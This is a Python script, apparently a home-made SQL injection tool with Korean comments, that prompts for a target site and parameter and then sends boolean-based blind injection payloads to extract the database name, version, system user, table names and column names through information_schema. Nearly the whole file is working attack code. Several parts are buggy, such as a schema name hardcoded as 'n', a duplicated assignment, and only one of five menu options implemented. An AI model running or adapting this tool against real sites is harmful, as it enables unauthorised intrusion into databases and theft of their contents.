import requests
import time
import os

def LinePrint(String, timeset=0.3):
    for i in String:
        print(i,end="")
        time.sleep(timeset)
    print("\n")


def send_data_text(pm, query, url):
    payload = {pm :query}
    return requests.get(url, params=payload)
    
def SQL_union_based_injection(True_page, comment_text, url, url_param_to_attack):
    
    System_data_list = ["database()", "@@version", "system_user()"]
    system_information = []
    System_data_dict = {}
    #시스템 정보 파악
    for i in range(len(System_data_list)):
        length = 1
        System_length = 0
        #길이
        while True:
            Now_page = send_data_text(url_param_to_attack, 
                                "' or 1=1 and length(" + System_data_list[i]+ ") = " + str(length) + comment_text, url)
            print("[+]" + Now_page.url)
            if(Now_page.text == True_page):
                System_length = length
                print("[+]" + System_data_list[i] + " : length : " + str(System_length))
                length = 1
                break
            length += 1
        
        name = ""
        #문자열 추측
        for j in range(1, System_length + 1):
            for k in range(32, 123):
                Now_page = send_data_text(url_param_to_attack, 
                                "' or 1=1 and substring(" + System_data_list[i] + ", " + str(j) + ", 1)='" + chr(k) + "'" + comment_text, url)
                print("[+]", Now_page.url)
                if(Now_page.text == True_page):
                    name += chr(k)
                    print("[+]find : " + chr(k))
                    break
        print("[+]"+str(i + 1)+"th system Extraction complete : " + System_data_list[i] + " : " + name)
        system_information.append(name)
    
        #정보 저장
        System_data_dict[System_data_list[i]] = system_information[i]

    #시스템 정보 출력
    print("-----------------------------")
    for key, value in System_data_dict.items():
        print("| " + key + " : " + value + " |")
    print("-----------------------------")  
    #테이블 개수 파악
    table_c = 0 #1
    while True:
        Now_page = send_data_text(url_param_to_attack, "' or 1=1 and length((select table_name from information_schema.tables where table_type='base table' and table_schema='n' limit " + str(table_c) + ",1))" + comment_text, url)
        print(Now_page.url)
        if(Now_page.text == True_page):
            if(table_c == 0):
                table_c += 1
                print("[+]Find table : {"+str(table_c)+"} Counting.")
                break
            else:
                print("[+]Find table : {"+str(table_c)+"} Counting.")
                break
        table_c += 1
        
    print("-"*30)
    print("[+]Table Count : " + str(table_c))
    print("-"*30)
            
        
    table_information = []
    table_data_dict = {}
    #테이블 이름 파악
    for i in range(table_c):
        length = 1
        while True:
            Now_page = send_data_text(url_param_to_attack, "' or 1=1 and length((select table_name from information_schema.tables where table_type='base table' and table_schema='" + "n" + "' limit " + str(i) + ",1))=" + str(length) + comment_text, url)
            print("[+]", Now_page.url)
            if(Now_page.text == True_page):
                print("[+] " + str(i + 1) + "th : table length : " + str(length))
                break
            length += 1

        name = ""
        for j in range(1, length + 1):
            for k in range(32, 123):
                Now_page = send_data_text(url_param_to_attack, 
                    "' or 1=1 and ascii(substring((select table_name from information_schema.tables where table_type='base table' and table_schema='" + "n" + "' limit " + str(i) + ",1), " + str(j) +", 1))=" + str(k) + comment_text,
                        url)
                print("[+]", Now_page.url)        
                if(Now_page.text == True_page):
                    name += chr(k)
                    print("[+]find : " + chr(k))
                    break
        print("[+]"+str(i + 1)+"th Table Extraction complete : " + name)
        table_information.append(name)
        table_data_dict[table_information[i]] = table_information[i]

    #테이블 정보 출력
    print("-----------------------------")
    for key, value in table_data_dict.items():
        print("| " + key + " : " + value + " |")
    print("-----------------------------")

    show_columns = []
    for i in range(len(table_information)):
        #테이블의 컬럼 개수 파악 
        column_c = 0
        while True:
            Now_page =  send_data_text(url_param_to_attack, "' or 1=1 and length((select column_name from information_schema.columns where table_name = '" + table_information[i] + "' limit " + str(column_c) + ", 1))" + comment_text, url)
            print("[+]", Now_page.url)
            if(Now_page.text != True_page): #거짓이라면
                if(column_c == 0):
                    column_c += 1
                print("[+]Find Column : {" + str(column_c) + "}" + " : Counting.")
                break
            else:
                column_c += 1
            
        print("-"*30)
        print("[+]("+table_information[i]+")Column : " + str(column_c))
        print("-"*30)
        #테이블의 컬럼명 파악
        for j in range(column_c):
            length = 1
            #테이블의 컬럼 개수 파악    
            while True:
                Now_page = Now_page =  send_data_text(url_param_to_attack, "' or 1=1 and length((select column_name from information_schema.columns where table_name = '" + table_information[i] + "' limit " + str(j) + ", 1))=" + str(length) + comment_text, url)
                print("[+]", Now_page.url)
                if(Now_page.text == True_page):
                    print("[+] " + str(j + 1) + "th : column length : " + str(length))
                    break
                length += 1
            name = ""
            #테이블의 컬럼명 문자 추측
            for k in range(1, length + 1):
                for l in range(32, 123):
                    Now_page = send_data_text(url_param_to_attack, "' or 1=1 and ascii(substring((select column_name from information_schema.columns where table_name = '" + table_information[i] + "' limit " + str(j) + ", 1)," + str(k) + ",1))=" + str(l) + comment_text, url)
                    print("[+]", Now_page.url)
                    if(Now_page.text == True_page):
                        name += chr(l)
                        print("[+]Find : " + chr(l))
                        break
            print("[+]Find : "+table_information[i]+" : Column Name : " + name)
            show_columns.append(name)
        #컬럼 정보 출력
        print("-----------------------------")
        for value in show_columns:
            print("| " + table_information[i] + " : " + value + " |")
        print("-----------------------------")
        show_columns.clear()
            
    

print("""
 _____  _____  _           _           _              _    _                     _                  _ 
/  ___||  _  || |         (_)         (_)            | |  (_)                   | |                | |
\ `--. | | | || |          _  _ __     _   ___   ___ | |_  _   ___   _ __       | |_   ___    ___  | |
 `--. \| | | || |         | || '_ \   | | / _ \ / __|| __|| | / _ \ | '_ \      | __| / _ \  / _ \ | |
/\__/ /\ \/' /| |____     | || | | |  | ||  __/| (__ | |_ | || (_) || | | |     | |_ | (_) || (_) || |
\____/  \_/\_\\_____/     |_||_| |_|  | | \___| \___| \__||_| \___/ |_| |_|      \__| \___/  \___/ |_|
                                     _/ |                                                             
                                    |__/                                                              
""")
print("""

                                       ___                                    _____         _                    
                                      |_  |                                  /  ___|       (_)                   
                                        | |  ___    __ _  _ __ ___           \ `--.  _ __   _  _ __    ___  _ __ 
                                        | | / _ \  / _` || '_ ` _ \           `--. \| '_ \ | || '_ \  / _ \| '__|
                                    /\__/ /| (_) || (_| || | | | | |         /\__/ /| | | || || |_) ||  __/| |   
                                    \____/  \___/  \__,_||_| |_| |_|         \____/ |_| |_||_|| .__/  \___||_|   
                                                                                              | |                
                                                                                              |_|                

""")
site_url_to_attack      =   input("Web site url to attack      : ")
url_param_to_attack     =   input("Url paramiter to attack     : ")
print("----------------------")
print("| Search         : 0 |")
print("| Select         : 1 |")
print("| Soap           : 2 |")
print("| Time Based     : 3 |")
print("| Boolean Based  : 4 |")
print("----------------------")
web_service_diversity   =   int(input("=> Web Site service category   : "))

cookie = {'PHPSESSID': '766418654597dd370ebf1c913cbe01e5'}
while True:
    #서비스 유형 : Search
    if(web_service_diversity == 0): 
        #거짓인 페이지
        default_page = requests.get(site_url_to_attack, params={url_param_to_attack : "'"})
        print("[+]" + default_page.url)
        #취약점 여부 확인.
        if "error" in default_page.text: 
            print("Possible attacked. :)")
            print("Are you sure you want to attack? [Y / N] : ", end="")
            sure = input()
            if(sure == 'Y'):
                #주석 문자 파악&참인 페이지 파악
                if(send_data_text(url_param_to_attack, "' or 1=1#", site_url_to_attack).text != default_page.text):
                    True_page = send_data_text(url_param_to_attack, "' or 1=1#", site_url_to_attack).text
                    comment_text = "#"
                if(send_data_text(url_param_to_attack, "' or 1=1--", site_url_to_attack).text != default_page.text):
                    True_page = send_data_text(url_param_to_attack, "' or 1=1--", site_url_to_attack).text
                    comment_text = "--"
                #시스템 정보 파악
                SQL_union_based_injection(True_page, comment_text, site_url_to_attack, url_param_to_attack)
            else:
                exit(0)
        else:
            print("Not attacked. :(")
            exit(0)





